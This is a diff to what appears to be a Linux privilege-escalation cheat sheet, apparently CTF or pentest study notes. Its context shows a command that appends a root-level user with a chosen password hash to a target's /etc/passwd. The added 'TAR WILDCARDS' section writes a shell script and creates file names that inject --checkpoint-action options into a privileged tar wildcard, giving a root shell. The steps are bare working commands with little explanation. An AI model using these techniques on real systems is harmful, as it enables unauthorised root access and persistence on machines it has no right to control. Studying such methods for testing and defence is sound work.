@@ -121,6 +121,8 @@
 
 - Creating a new user can help us escalate privileges,on your system,do `openssl passwd {choice of password}` and in your target machine do this
 
+
+
       echo '[usernameyou want]:[openssl generated hash]:0:0:root:/root:/bin/bash' >> /mnt/root/etc/passwd`
 
 ### Privesc with capabilities
@@ -151,5 +153,13 @@ Using a fine-grained set of privileges: Use of capability can be more clearly un
           ls
           ./tar -xvf shadow.tar
         
-          
+### TAR WILDCARDS
+
+            cd /opt/backup
+            echo -e '#!/bin/bash\n/bin/bash' > shell.sh
+            echo "" > "--checkpoint-action=exec=sh shell.sh"
+            echo "" > --checkpoint=1
+            
+
+
             
